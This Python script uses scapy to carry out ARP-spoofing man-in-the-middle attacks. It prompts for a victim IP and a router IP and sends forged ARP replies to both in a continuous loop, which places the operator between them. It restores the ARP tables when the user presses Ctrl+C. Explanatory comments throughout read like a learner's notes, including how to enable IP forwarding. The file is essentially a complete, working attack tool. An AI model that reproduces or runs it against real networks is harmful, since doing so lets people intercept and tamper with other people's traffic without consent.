#!/usr/bin/env/python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_result = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_result
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
    # verbose = False is passed to hide the data of the srp function
    # timeout =1 is used to stop the function in 1 sec.
    # srp returns two lists , one is answered list and one is unanswered list but we only requires answered list.so we put[0] at the end of srp to return the answered list assigned at index 0


    # psrc is the ip of the client which receive the packet we send and
    # hwsrc is the mac address of the machine whose ip is given in hwsrc.

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False)
    #op=2 for response not request, and pdst is the ip of victim/router , and hwdst id the mac address of
    #victim or router , spoof ip is the ip of prtending to be , i mean saying that i am router ip to the victim or
    #victim ip to router, fooling both of them.

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = raw_input("Input the Victim Ip: ")
gateway_ip = raw_input("Input the Router Ip: ")
def main(target_ip, gateway_ip):
    try:
        sent_packet_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packet_count = sent_packet_count + 2
            print("\r[+] You Are Now Middle Man ... Packets sent: " + str(sent_packet_count)),
            # in python 3 , we dont have to import anything just we have to do as follow
            # print("\r[+] You Are Now Middle Man ... Packets sent: " + str(sent_packet_count), end ="")
            sys.stdout.flush()
            time.sleep(2)
            # ctrl+c to stop to the program.
            # echo 1 > /proc/sys/net/ipv4/ip_forward
            # to do this in python 2 , this is above process that is defined below, this same is applied in line 5,34,35
            # to print dynamically in python you have to import lib sys and then
            # #put \r in starting of print statement to print the horizonatally and give , after print statement that store every print statement in a line
            # sys.stdout.flush() will flush statement in horizontal way
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL + C ...... Resetting ARP Tables Please wait a while!")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
    except IndexError:
        print("\n[-] Found list is out of range, or packets are unanswered!\n[+] Resetting ARP Tables wait a While!")
        # restore(target_ip, gateway_ip)
        # restore(gateway_ip, target_ip)
        main(target_ip, gateway_ip)

main(target_ip, gateway_ip)